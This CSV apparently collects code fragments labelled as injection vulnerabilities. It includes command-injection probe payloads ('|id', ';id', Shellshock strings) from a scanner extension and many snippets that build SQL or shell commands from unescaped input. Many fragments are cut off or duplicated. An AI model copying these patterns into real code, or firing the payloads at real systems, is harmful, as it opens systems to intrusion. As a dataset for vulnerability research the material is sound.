Vulnerability,Source
"    @staticmethod    def test(self):            ""|id"",            ""=cmd|'cmd'!''"",            "";id"",            ""\n\rid"",            ""`id`"",            ""${id}"",            ""\x00`id`"",    @staticmethod    def wafbypass(self):",vulns_injection
"version = ""1.0.9""",vulns_injection
"        resp_start = self._helpers.bytesToString(attack.getResponse())[:30]        if '400 Illegal character 0x0 in state' in resp_start:                                                ""The application appears to be running a version of Jetty vulnerable to CVE-2015-2080, which allows attackers to read out private server memory.<br/>""                                                ""Refer to http://blog.gdssecurity.com/labs/2015/2/25/jetleak-vulnerability-remote-leakage-of-shared-buffers-in-je.html for further information."", 'Firm', 'High')]",vulns_injection
"            'any': ['""&timeout $time&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }'],            'ruby': [],",vulns_injection
"            if (self._attack(basePair, insertionPoint, payload, 10)[0] > baseTime + 6):                    (timer, attack) = self._attack(basePair, insertionPoint, payload, 10)",vulns_injection
        ext = self._helpers.analyzeRequest(basePair).getUrl().getPath().split('.')[-1],vulns_injection
"            'any': ['""&ping -n $time localhost&\'`sleep $time`\'', '() { :;}; /bin/sleep $time', '() { _; } >_[$$($$())] { /bin/sleep $time; }'],",vulns_injection
        cmd = cmd + ' -' + args,vulns_injection
        cmd = cmd + ' -' + args,vulns_injection
"	error=''	try:		if 'username' in session:			if request.method == 'POST':				if 'file' in request.files.keys():					f = request.files['file']					f.save(""static/videos/{}"".format(f.filename))					data=users.query.filter_by(Username=session['username']).first()					new_video = Video(VideoID = None, UserID = data.UserID, URL = ""local"", Name = f.filename, UploadDate = datetime.today().strftime('%Y-%m-%d'))					db.session.add(new_video)					db.session.commit()				if 'link11' in request.form.keys():					url = request.form['link11']",vulns_injection
"			videos = []			for video in os.listdir(""static/videos""):				video_uploader = Video.query.filter_by(Name=video).first()				video_uploader = users.query.filter_by(UserID=video_uploader.UserID).first()				videos.append((video, video_uploader.Username))			return render_template('upload.html', videos=videos)	except Exception as e:		return render_template(""upload"", error = e)",vulns_injection
"			os.remove(""static/videos/{}"".format(filename))",vulns_injection
"        if 'can not parse header when' in line:            ip = line.split()[-1].split(':')[-2]            if ip not in ips:                ips[ip] = 1                print(ip)                sys.stdout.flush()            else:                ips[ip] += 1            if ip not in banned and ips[ip] >= config.count:                banned.add(ip)                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                print(cmd, file=sys.stderr)                sys.stderr.flush()                os.system(cmd)",vulns_injection
"        if 'can not parse header when' in line:            ip = line.split()[-1].split(':')[-2]            if ip not in ips:                ips[ip] = 1                print(ip)                sys.stdout.flush()            else:                ips[ip] += 1            if ip not in banned and ips[ip] >= config.count:                banned.add(ip)                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                print(cmd, file=sys.stderr)                sys.stderr.flush()                os.system(cmd)",vulns_injection
"        if 'can not parse header when' in line:            ip = line.split()[-1].split(':')[-2]            if ip not in ips:                ips[ip] = 1                print(ip)                sys.stdout.flush()            else:                ips[ip] += 1            if ip not in banned and ips[ip] >= config.count:                banned.add(ip)                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                print(cmd, file=sys.stderr)                sys.stderr.flush()                os.system(cmd)",vulns_injection
"        if 'can not parse header when' in line:            ip = line.split()[-1].split(':')[-2]            if ip not in ips:                ips[ip] = 1                print(ip)                sys.stdout.flush()            else:                ips[ip] += 1            if ip not in banned and ips[ip] >= config.count:                banned.add(ip)                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                print(cmd, file=sys.stderr)                sys.stderr.flush()                os.system(cmd)",vulns_injection
"        if 'can not parse header when' in line:            ip = line.split()[-1].split(':')[-2]            if ip not in ips:                ips[ip] = 1                print(ip)                sys.stdout.flush()            else:                ips[ip] += 1            if ip not in banned and ips[ip] >= config.count:                banned.add(ip)                cmd = 'iptables -A INPUT -s %s -j DROP' % ip                print(cmd, file=sys.stderr)                sys.stderr.flush()                os.system(cmd)",vulns_injection
"class Command(stack.commands.HostArgumentProcessor,",vulns_injection
"				name = '%s' """""" % name)				name = '%s' """""" % name)",vulns_injection
"				raidlevel, arrayid, options) values ('%s', %s, %s, %s,				%s, %s, %s, '%s') """""" % (scope, tableid, adapter,",vulns_injection
"				raidlevel, arrayid, options) values ('%s', %s, %s, %s,				%s, %s, %s, '%s') """""" % (scope, tableid, adapter,",vulns_injection
"class Command(stack.commands.HostArgumentProcessor,",vulns_injection
	<param type='int' name='size' optional='1'>,vulns_injection
	<param type='string' name='partid' optional='1'>,vulns_injection
"			Scope='%s' and TableID=%s and device= '%s'			and Mountpoint='%s'"""""" % (scope, tableid, device, mountpt))",vulns_injection
			except:				partid = None,vulns_injection
			return,vulns_injection
"		elif scope in [ 'appliance', 'host']:",vulns_injection
			return,vulns_injection
"			if name == ""host"" or name == ""appliance"":",vulns_injection
"		device, size, fstype, mountpt, options, partid = \			self.fillParams([				('device', None, True),				('size', None), 				('type', None), 				('mountpoint', None),				('options', None),				('partid', None),				])		if size:			try:				s = int(size)			except:				if mountpt == 'swap' and \					size not in ['recommended', 'hibernation']:						raise ParamType(self, 'size', 'integer')				else:					raise ParamType(self, 'size', 'integer')",vulns_injection
"		tableid = None		if scope == 'global':			tableid = -1		elif scope == 'appliance':			self.db.execute(""""""select id from appliances where				name = '%s' """""" % name)			tableid, = self.db.fetchone()			self.db.execute(""""""select id from oses where name = %s """""", name)			tableid, = self.db.fetchone()			self.db.execute(""""""select id from nodes where				name = '%s' """""" % name)			tableid, = self.db.fetchone()				sqlvars = ""Scope, TableID, device, Mountpoint, Size, FsType, Options""		sqldata = ""'%s', %s, '%s', '%s', %s, '%s', '%s'"" % \			(scope, tableid, device, mountpt, size, fstype, options)		if partid:			sqlvars += "", PartID""			sqldata += "", %s"" % partid		self.db.execute(""""""insert into storage_partition			(%s) values (%s) """""" % (sqlvars, sqldata))",vulns_injection
"				query = """"""select scope, device, mountpoint, size, fstype, options, partid ",vulns_injection
"				from oses where name = '%s') order by device,partid,fstype,size"""""" % args[0]				where name = '%s') order by device,partid,fstype, size"""""" % args[0]				where name = '%s') order by device,partid,fstype, size"""""" % args[0]		self.db.execute(query)		i = 0		for row in self.db.fetchall():			name, device, mountpoint, size, fstype, options, partid = row				name = args[0]	",vulns_injection
"			self.addOutput(name, [device, partid, mountpoint,				size, fstype, options])			i += 1		self.endOutput(header=['scope', 'device', 'partid', 'mountpoint', 'size', 'fstype', 'options'], trimOwner=False)",vulns_injection
"			('scope', 'global'), ('device', None), ('mountpoint', None)])",vulns_injection
"		tableid = -1		tablename = {""os"":""oses"", ""appliance"":""appliances"", ""host"":""nodes""}		if scope != 'global':			self.db.execute(""""""select id from %s where				name = '%s' """""" % (tablename[scope], name))			tableid, = self.db.fetchone()		deletesql = """"""delete from storage_partition where			scope = '%s' and tableid = %s """""" % (scope, tableid)			deletesql += """""" and device = '%s'"""""" % device			deletesql += """""" and mountpoint = '%s'"""""" % mountpoint		self.db.execute(deletesql)",vulns_injection
"		rows = self.db.execute(""""""			select attr from attributes where attr='%s'			"""""" % (attr))		self.db.execute(""""""			delete from attributes_doc where attr='%s'			"""""" % (attr))			self.db.execute(				""""""				insert into attributes_doc				(attr, doc)				values ('%s', '%s')				"""""" % (attr, doc))",vulns_injection
    return True # for testing,vulns_injection
"        subprocess.run(cmd, shell=True, timeout=60, check=True)",vulns_injection
"     'get': 'sudo defaults read /Library/Preferences/com.apple.mDNSResponder.plist NoMulticastAdvertisements',     'get': 'sudo defaults read /Library/Preferences/SystemConfiguration/com.apple.captive.control Active',",vulns_injection
"from mysql_commands import *	return select_row_from_mysql_command(""SELECT * FROM apps"")	return select_row_from_mysql_command(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)	return select_row_from_mysql_command(""SELECT * FROM devices WHERE user_id=?"", user_id)",vulns_injection
"import sqlalchemyfrom sqlalchemy import textfrom sqlalchemy.orm import sessionmaker, scoped_sessionengine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')Session = scoped_session(sessionmaker(bind=engine))s = Session()def select_row_from_mysql_command(command_str):    ''' function for selecting a specific row  '''    ''' OUPUT: a list of elements in the selected row '''    sql = text(str(command_str))    return s.execute(sql).fetchall()def insert_into_mysql_command(command_str):        ''' the function inserts data depending from a command_str '''        sql = text(str(command_str))        s.execute(sql)        s.commit()",vulns_injection
"import sqlalchemyfrom sqlalchemy import textfrom sqlalchemy.orm import sessionmaker, scoped_sessionengine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')Session = scoped_session(sessionmaker(bind=engine))	return s.execute(""SELECT * FROM apps"").fetchall()	return s.execute(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)	return s.execute(""SELECT * FROM devices WHERE user_id=?"", user_id)",vulns_injection
from zengine.lib.exceptions import HTTPError,vulns_injection
            headers = {'remote_ip': input['_zops_remote_ip']},vulns_injection
            self.cmd += ' -l %s ' % self.get_option('label'),vulns_injection
"        cluster = self.get_option('cluster') or '%'        datacenter = self.get_option('datacenter') or '%'        self.dbcmd = '/usr/share/ovirt-engine/dbscripts/engine-psql.sh -c \""'        self.dbcmd += (""select host_name from vds_static where cluster_id in ""                       ""(select cluster_id from cluster where name like \'%s\'""                       "" and storage_pool_id in (select id from storage_pool ""                       ""where name like \'%s\'))\"""" % (cluster, datacenter))",vulns_injection
                    value = pipes.quote(option.split('=')[1].split()[0]),vulns_injection
"            filt = ['&', '|', '>', '<']                    self.config['sos_cmd'], self.config['sos_opt_line'])            self.config['sos_cmd'] += ' --case-id=%s' % self.config['case_id']                                       % self.config['log_size'])            self.config['sos_cmd'] += ' -s %s' % self.config['sysroot']            self.config['sos_cmd'] += ' -c %s' % self.config['chroot']            self.config['sos_cmd'] += ' -z %s' % self.config['compression']",vulns_injection
        for cluster in checks:,vulns_injection
"            self.sos_cmd = ' %s %s' % (self.sos_cmd, label)",vulns_injection
                self.sos_cmd += ' --only-plugins=%s' % only,vulns_injection
                self.sos_cmd += ' --skip-plugins=%s' % skipln,vulns_injection
"                self.sos_cmd += ' --enable-plugins=%s' % enable                self.sos_cmd += ' -k %s' % ','.join(o for o in opts)                self.sos_cmd += ' --preset=%s' % self.config['preset']",vulns_injection
"        aliases=['define', 'def', 'dfn'],",vulns_injection
"""""""Owner-only commands. These do tasks such as restart the bot.""""""import subprocessimport sysimport discordimport timeimport neko__all__ = ['OwnerOnlyCog', 'setup']def __run_git_command(dont_stash, *args):    entry_point = os.path.dirname(sys.argv[0])    entry_point = os.path.join(entry_point, '..')    if not dont_stash:        subprocess.run(            ['git', 'stash'],            cwd=entry_point,            stdout=subprocess.PIPE,            stderr=subprocess.PIPE,            timeout=60,            encoding='ascii'        )    result = subprocess.run(        ['git', *args],        cwd=entry_point,        stdout=subprocess.PIPE,        stderr=subprocess.PIPE,        timeout=60,        encoding='ascii'    )    if not dont_stash:        subprocess.run(            ['git', 'stash', 'apply'],            cwd=entry_point,            stdout=subprocess.PIPE,            stderr=subprocess.PIPE,            timeout=60,            encoding='ascii'        )    return resultasync def _git_stash_and_do(ctx, *args, dont_stash=False):    async with ctx.channel.typing():        completed_process = await neko.no_block(            __run_git_command,            args=[dont_stash, *args]        )        print(completed_process.stdout)        print(completed_process.stderr, file=sys.stderr)        stream = 'stderr' if completed_process.returncode else 'stdout'        stream = getattr(completed_process, stream)        title = f'git {"" "".join(args)}'        if len(stream) > 1900:            pb = neko.PaginatedBook(                title=title,                ctx=ctx,                max_size=800            )            pb.add_lines(stream)            await pb.send()        else:            await ctx.send(                embed=discord.Embed(                    title=title,                    description=stream,                    color=0x9b2d09                )            )class OwnerOnlyCog(neko.Cog):    """"""Cog containing owner-only commands, such as to restart the bot.""""""    permissions = (neko.Permissions.SEND_MESSAGES |                   neko.Permissions.ADD_REACTIONS |                   neko.Permissions.READ_MESSAGES |                   neko.Permissions.MANAGE_MESSAGES)    async def __local_check(self, ctx):        """"""Only the owner can run any commands or groups in this cog.""""""        return await ctx.bot.is_owner(ctx.author)    @neko.group(        name='sudo',        usage='|subcommand',        brief='Commands and utilities only runnable by the bot owner.',        hidden=True,        invoke_without_command=True)    async def command_grp(self, ctx):        """"""        Run without any arguments to show a list of available commands.        """"""        book = neko.PaginatedBook(title='Available commands',                                   ctx=ctx)        for command in self.command_grp.commands:            book.add_line(command.name)        await book.send()    @command_grp.command(        name='stop', aliases=['restart'],        brief='Kills the event loop and shuts down the bot.')    async def stop_bot(self, ctx):        await ctx.send('Okay, will now logout.')        await ctx.bot.logout()    @command_grp.command(        name='invite',        brief='DM\'s you a bot invite.'    )    async def invite(self, ctx):        await ctx.author.send(ctx.bot.invite_url)    @command_grp.command(        name='load',        brief='Loads a given extension into the bot.',        usage='extension.qualified.name'    )    async def load(self, ctx, *, fqn):        """"""        Loads the given extension name into the bot.        WARNING! This will not run in an executor. If the extension loading        process blocks, then the entire bot will block.        """"""        start = time.time()        ctx.bot.load_extension(fqn)        delta = (time.time() - start) * 1e4        await ctx.send(f'Loaded `{fqn}` successfully in {delta:.3}ms')    @command_grp.command(        name='unload',        brief='Unloads a given extension from the bot (and any related cogs).',        usage='extension.qualified.name|-c CogName'    )    async def unload(self, ctx, *, fqn):        """"""        Unloads the given extension name from the bot.        WARNING! This will not run in an executor. If the extension loading        process blocks, then the entire bot will block.        Note. If you wish to remove a single cog instead... pass the fqn        in with the -c flag.        """"""        if fqn.startswith('-c'):            fqn = fqn[2:].lstrip()            if fqn not in ctx.bot.cogs:                raise ModuleNotFoundError(                    'Cog was not loaded to begin with.'                )            func = ctx.bot.remove_cog        else:            if fqn not in ctx.bot.extensions:                raise ModuleNotFoundError(                    'Extension was not loaded to begin with.'                )            func = ctx.bot.unload_extension        start = time.time()        func(fqn)        delta = (time.time() - start) * 1e4        await ctx.send(f'Unloaded `{fqn}` successfully via '                       f'{func.__name__} in {delta:.3}ms')    @command_grp.group(        name='git',        brief='Various version control tasks.'    )    async def git_group(self, ctx):        pass    @git_group.command(        name='pull',        brief='Executes `git pull`.'    )    async def git_pull(self, ctx):        await _git_stash_and_do(ctx, 'pull')    @git_group.command(        name='checkout',        brief='Executes `git checkout`.'    )    async def git_checkout(self, ctx, *, branch: str):        await _git_stash_and_do(ctx, 'checkout', branch)    @git_group.command(        name='log',        brief='Executes `git log`.'    )    async def git_log(self, ctx):        """"""Shows the git log. Suppresses any email information.""""""        await _git_stash_and_do(            ctx,            'log',            '-n',            '30',            '--oneline',            dont_stash=True        )setup = OwnerOnlyCog.mksetup(",vulns_injection
"__all__ = ['NekoCommand', 'NekoGroup', 'command', 'group']",vulns_injection
"        traceback.print_exception(type(error), error, error.__traceback__)",vulns_injection
"        error_description = strings.pascal_to_space(type(error).__name__)        cog = strings.pascal_to_space(getattr(cog, 'name', str(cog)))        error_description += f' in {cog}: {str(error)}'        embed.set_footer(text=error_description)        traceback.print_exception(type(error), error, error.__traceback__)",vulns_injection
        :exc:`.CommandError` should be used. Note that if the checks fail then        :exc:`.CheckFailure` exception is raised to the,vulns_injection
        :exc:`.CommandError` should be used. Note that if the checks fail,vulns_injection
            command_to_page[cmd.qualified_name] = i + offset        try:            page_index = command_to_page[query]        except KeyError:,vulns_injection
"        output = str(subprocess.check_output('youtube-dl --get-title %s --no-warnings' % url, stderr=subprocess.STDOUT,                                             shell=True)).strip()",vulns_injection
                'xfs': ['xfsprogs'],vulns_injection
"    util.subp(['modprobe', 'bcache'], rcs=[0, 1])",vulns_injection
"from curtin.block import (mdadm, mkfs, clear_holders, lvm, iscsi)",vulns_injection
        'bcache': bcache_handler,vulns_injection
    return check_executables() + check_imports(),vulns_injection
"    def precmd(self, line):        cmds = self._decompose(line)        if len(cmds) > 1:            self.cmdqueue.extend(cmds[1:])        return cmds[0]    def _decompose(self, line):        breakpoints = self._find_breakpoints(line)        inclusive_breakpoints = [0] + breakpoints + [len(line)]        cmds = []        for i in range(len(breakpoints) + 1):            start = inclusive_breakpoints[i]            end = inclusive_breakpoints[i+1]            cmd = line[start:end]            if cmd and cmd[0] == ';':  # The first cmd fails this check                cmd = cmd[1:]            if cmd:  # Catch empty cmds from dud-EOL-semicolons                cmds.append(cmd.strip())        return cmds    def _find_breakpoints(self, line):        breakpoints = []        in_quote = False        for i, ch in enumerate(line):            if ch in [""\"""", ""'""]:                in_quote = not in_quote            if ch == ';' and not in_quote:                breakpoints.append(i)            if ch == '#' and not in_quote:                break  # This is comment territory, ignore everything.        return breakpoints",vulns_injection
"        args = shlex.split(arg, comments=True)",vulns_injection
"        for i in range(len(args)):            arg = args[i]            pat, hint = _get_pat_and_hint(arg)            if not pat and not hint:                continue            _inject_id(self, args, i, pat, hint)",vulns_injection
        k8s_client.create_namespaced_pod(,vulns_injection
"        with host.sudo():            cmd_nslookup = (""kubectl --kubeconfig=/etc/kubernetes/admin.conf""                            "" exec -ti {0} nslookup {1}"".format(                                pod_name,                                hostname))            res = host.run(cmd_nslookup)            assert res.rc == 0, ""Cannot resolve {}"".format(hostname)",vulns_injection
"        cmd = (""kubectl --kubeconfig=/etc/kubernetes/admin.conf""               "" get {0} --namespace {1} -o custom-columns=:metadata.name"")        cmd_res = host.check_output(cmd.format(resource, namespace))    assert len(cmd_res.strip()) > 0, 'No {0} found in namespace {1}'.format(",vulns_injection
"    cmd = ' '.join([        'kubectl',        '--kubeconfig=/etc/kubernetes/admin.conf',        'exec',        '--namespace {0}'.format(namespace),    ])    with host.sudo():        host.check_output(cmd)",vulns_injection
"        cmd = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'               ' get pods -n kube-system'               ' --no-headers -o custom-columns="":metadata.name""')        pods_list = host.check_output(cmd)            cmd_logs = ('kubectl --kubeconfig=/etc/kubernetes/admin.conf'                        ' logs {} --limit-bytes=1 -n kube-system'.format(                            pod_id))            res = host.check_output(cmd_logs)                assert len(res.strip()) > 0, (",vulns_injection
import shlex,vulns_injection
    cmd = shlex.split(command)    output_lines = subprocess.check_output(cmd).decode('utf-8').split('\n'),vulns_injection
        str -- first line of output    cmd = shlex.split(command)    return subprocess.check_output(cmd).decode('utf-8').split('\n')[0],vulns_injection
    host = poll_result.answer.split('.')[3],vulns_injection
"def task_successful(poll_result, expected):",vulns_injection
    output = poll_result.output[0]    return output[-2] == '0',vulns_injection
"        if domain is None:            options = opt_str.format(                    username, password,                    poll_input.server, poll_input.port)        else:            opt_str = '--ignore-certificate --authonly -d {} -u \'{}\' -p \'{}\' {}:{}'            options = opt_str.format(                    domain.domain, username, password,                    poll_input.server, poll_input.port)            output = subprocess.check_output('xfreerdp {}'.format(options), shell=True, stderr=subprocess.STDOUT)            if ('connected to' in str(e.output) and 'Authentication failure' not in str(e.output)) or (e.returncode == 131 and 'negotiation' in str(e.output)):                result = RdpPollResult(True)                return result            print(""{{{{%s}}}}"" % e.output)            result = RdpPollResult(False, e)",vulns_injection
"            if _valid_command(grain[key]):                value = __salt__['cmd.run']('salt-call grains.get {0}'.format(grain[key])).split('\n')[1].strip()                grains[key] = value            if _valid_command(pillar[key]):                value = __salt__['cmd.run']('salt-call pillar.get {0}'.format(pillar[key])).split('\n')[1].strip()                grains[key] = valuedef _valid_command(string):    '''    Check for invalid characters in the pillar or grains key    '''    invalid_characters = re.findall('[^a-zA-Z0-9:_-]',string)    if len(invalid_characters) > 0:        log.info(""Command: {0} contains invalid characters: {1}"".format(string, invalid_characters))        return False    else:        return True",vulns_injection
"		cursor.execute(""SELECT rank FROM users WHERE discordId = "" + str(discordId))",vulns_injection
"		cursor.execute(""UPDATE users SET ppAverage = "" + str(pp_average) + "" WHERE DiscordId = "" + str(discordId))",vulns_injection
"	cursor.execute(""SELECT * FROM users WHERE discordId = "" + str(discordId))",vulns_injection
"		cursor.execute(""UPDATE users SET osuName = '"" + osuName + ""', osuId = "" + str(osuId) + "", rank = '"" + rank + ""' WHERE discordId = "" + str(discordId))",vulns_injection
"		await client.change_presence(status=discord.Status('online'), game=discord.Game(name='Osu !'))",vulns_injection
"		cursor.execute(""SELECT state FROM muted WHERE serverID = "" + str(message.server.id))",vulns_injection
"		cursor.execute(""SELECT ppAverage FROM users WHERE DiscordId = "" + str(message.author.id))",vulns_injection
"				cursor.execute(""Select recomendedBeatmaps From users where DiscordId = "" + str(message.author.id))				cursor.execute(""Select * from beatmaps where pp_95 >= "" + str(pp_average-pp_average_fluctuation) + "" and pp_95 <= "" + str(pp_average+pp_average_fluctuation) + "" and id not in("" + alreadyRecomendedId + "") Limit 1"")",vulns_injection
"				cursor.execute(""UPDATE users SET recomendedBeatmaps = '"" + alreadyRecomendedId + ""' where DiscordId = '"" + str(message.author.id) + ""'"")",vulns_injection
"			await client.send_message(message.channel, ""Invalid url !"")",vulns_injection
"				cursor.execute(""select url from beatmaps where url = '"" + beatmapUrl + ""'"")",vulns_injection
"				cursor.execute(""SELECT * FROM muted WHERE serverID = "" + str(message.server.id))					cursor.execute(""UPDATE muted SET state = '"" + parameter + ""' WHERE serverID = "" + str(message.server.id))",vulns_injection
"		cursor.execute(""SELECT OsuId FROM users WHERE DiscordId = "" + str(message.author.id))",vulns_injection
Evry Api parameters written in this file are private and secret ! ,vulns_injection
"	workingDirrectory = """" #The full path to OsuBot.py",vulns_injection
"        embed.description = ""You have 3 possible options for installing CFW:\n- [NTRBoot](https://3ds.guide/ntrboot) which needs a compatible DS flashcart and maybe an additional hacked 3DS or DS(i) console depending on the flashcart\n- [DSiWare](https://3ds.guide/installing-boot9strap-\(dsiware\)) which requires a hacked 3DS\n- [Hardmod](https://3ds.guide/installing-boot9strap-\(hardmod\)) which requires soldering **Not for beginners!**\n **Downgrading is impossible on 11.4+!**""        await self.simple_embed(""If you are looking for homebrew on your stock 11.4+ 3DS, you will need an entrypoint (like ninjhax, freakyhax, etc) for launching homebrew launcher"")",vulns_injection
"        embed.set_author(name=""Plailect"", url=""https://3ds.guide/troubleshooting#twl_broken"")        embed.url = ""https://3ds.guide/troubleshooting#twl_broken""",vulns_injection
"    def _cmd_to_dict(self, cmd):        arg_list = cmd.split()",vulns_injection
        arg_list = cmd.split(),vulns_injection
"    def _run_ssh(self, command, check_exit_code=True, attempts=1):",vulns_injection
        generator = self._port_conf_generator('svcinfo lsportip'),vulns_injection
            ssh_cmd = 'svcinfo lsnode -delim ! %s' % node['id'],vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -delim ! -nohdr',vulns_injection
            ssh_cmd = 'svcinfo lslicense -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsnode -delim !',vulns_injection
"        ssh_cmd = ('svctask chhost -chapsecret ""%(chap_secret)s"" %(host_name)s'                   % {'chap_secret': chap_secret, 'host_name': host_name})",vulns_injection
        ssh_cmd = 'svcinfo lsiscsiauth -delim !',vulns_injection
            ssh_cmd = 'svcinfo lsfabric -wwpn %s -delim !' % wwpn,vulns_injection
            ssh_cmd = 'svcinfo lshost -delim ! %s' % host,vulns_injection
        ssh_cmd = 'svcinfo lshost -delim !',vulns_injection
"        ssh_cmd = ('svctask mkhost -force %(port1)s -name ""%(host_name)s""' %                   {'port1': port1, 'host_name': host_name})            ssh_cmd = ('svctask addhostport -force %s %s' % (port, host_name))",vulns_injection
        ssh_cmd = 'svcinfo lshostvdiskmap -delim ! %s' % host_name,vulns_injection
"            ssh_cmd = ('svctask mkvdiskhostmap -host %(host_name)s -scsi '                       '%(result_lun)s %(volume_name)s' %                       {'host_name': host_name,                        'result_lun': result_lun,                        'volume_name': volume_name})",vulns_injection
"                ssh_cmd = ssh_cmd.replace('mkvdiskhostmap',                                          'mkvdiskhostmap -force')",vulns_injection
        ssh_cmd = 'svctask rmhost %s ' % host_name,vulns_injection
        cmd = 'svcinfo lsfabric -host %s' % host_name,vulns_injection
"            ssh_cmd = 'svctask rmvdiskhostmap -host %s %s' % \                (host_name, vol_name)",vulns_injection
        ssh_cmd = 'svcinfo lsvdisk -bytes -delim ! %s ' % vdisk_name        ssh_cmd = 'svcinfo lsvdiskfcmappings -nohdr %s' % vdisk_name,vulns_injection
"        autoex = '-autoexpand' if opts['autoexpand'] else ''        easytier = '-easytier on' if opts['easytier'] else '-easytier off'            ssh_cmd_se_opt = ''            ssh_cmd_se_opt = (                '-rsize %(rsize)d%% %(autoex)s -warning %(warn)d%%' %                {'rsize': opts['rsize'],                 'autoex': autoex,                 'warn': opts['warning']})                ssh_cmd_se_opt = ssh_cmd_se_opt + ' -compressed'                ssh_cmd_se_opt = ssh_cmd_se_opt + (                    ' -grainsize %d' % opts['grainsize'])        ssh_cmd = ('svctask mkvdisk -name %(name)s -mdiskgrp %(mdiskgrp)s '                   '-iogrp 0 -size %(size)s -unit '                   '%(unit)s %(easytier)s %(ssh_cmd_se_opt)s'                   % {'name': name,                   'mdiskgrp': self.configuration.storwize_svc_volpool_name,                   'size': size, 'unit': units, 'easytier': easytier,                   'ssh_cmd_se_opt': ssh_cmd_se_opt})",vulns_injection
"        copyflag = '' if full_copy else '-copyrate 0'        fc_map_cli_cmd = ('svctask mkfcmap -source %(src)s -target %(tgt)s '                          '-autodelete %(copyflag)s' %                          {'src': source,                           'tgt': target,                           'copyflag': copyflag})",vulns_injection
"            out, err = self._run_ssh('svctask prestartfcmap %s' % fc_map_id)",vulns_injection
"            out, err = self._run_ssh('svctask startfcmap %s' % fc_map_id)",vulns_injection
        fc_ls_map_cmd = 'svcinfo lsfcmap -filtervalue id=%s -delim !' % \            fc_map_id,vulns_injection
                        ssh_cmd = ('svctask chfcmap -copyrate 50 '                                   '-autodelete on %s' % map_id),vulns_injection
                            self._run_ssh('svctask stopfcmap %s' % map_id)                            self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask stopfcmap %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id)                        self._run_ssh('svctask rmfcmap -force %s' % map_id),vulns_injection
"        forceflag = '-force' if force else ''        cmd_params = {'frc': forceflag, 'name': name}        ssh_cmd = 'svctask rmvdisk %(frc)s %(name)s' % cmd_params",vulns_injection
"        ssh_cmd = ('svctask expandvdisksize -size %(amt)d -unit gb %(name)s'                   % {'amt': extend_amt, 'name': volume['name']})",vulns_injection
        ssh_cmd = 'svcinfo lssystem -delim !',vulns_injection
        ssh_cmd = 'svcinfo lsmdiskgrp -bytes -delim ! %s' % pool,vulns_injection
        ssh_cmd = '%s -delim !' % cmd,vulns_injection
                    ' command %s') % ssh_cmd),vulns_injection
"                  % {'cmd': ssh_cmd,",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -persona 1 -domain (\'OpenStack\',) '                           'fakehost 123456789012345 123456789054321')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -add fakehost '                           '123456789012345 123456789054321')        show_host_cmd = 'showhost -verbose fakehost',vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')",vulns_injection
"        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -persona 1 -domain '                           '(\'OpenStack\',) '                           'fakehost iqn.1993-08.org.debian:01:222')        show_3par_cmd = 'showhost -verbose fakehost.foo'",vulns_injection
        show_host_cmd = 'showhost -verbose fakehost'        create_host_cmd = ('createhost -iscsi -add fakehost '                           'iqn.1993-08.org.debian:01:222'),vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -host fakehost',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname'        show_vlun_cmd = 'showvlun -a -host fakehost'        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
        show_port_cmd = 'showport'        show_port_i_cmd = 'showport -iscsi'        show_port_i_cmd = 'showport -iscsiname',vulns_injection
        show_vlun_cmd = 'showvlun -a -showcols Port',vulns_injection
"        self._cli_run(""setwsapi -sru high"", None)",vulns_injection
"            self._cli_run(""growvv -f %s %sg"" % (volume_name, growth_size),                          None)",vulns_injection
"    def _cli_run(self, verb, cli_args):        cli_arg_strings = []        if cli_args:            for k, v in cli_args.items():                if k == '':                    cli_arg_strings.append("" %s"" % k)                else:                    cli_arg_strings.append("" %s=%s"" % (k, v))        cmd = verb + ''.join(cli_arg_strings)",vulns_injection
"    def _run_ssh(self, command, check_exit=True, attempts=1):",vulns_injection
"        self._cli_run('removehost %s' % hostname, None)        out = self._cli_run('createvlun %s auto %s' % (volume, hostname), None)",vulns_injection
"        out = self._cli_run('showhost -verbose %s' % (hostname), None)",vulns_injection
"        out = self._cli_run('showport', None)",vulns_injection
"        out = self._cli_run('showport -iscsi', None)",vulns_injection
"        result = self._cli_run('showport -iscsiname', None)",vulns_injection
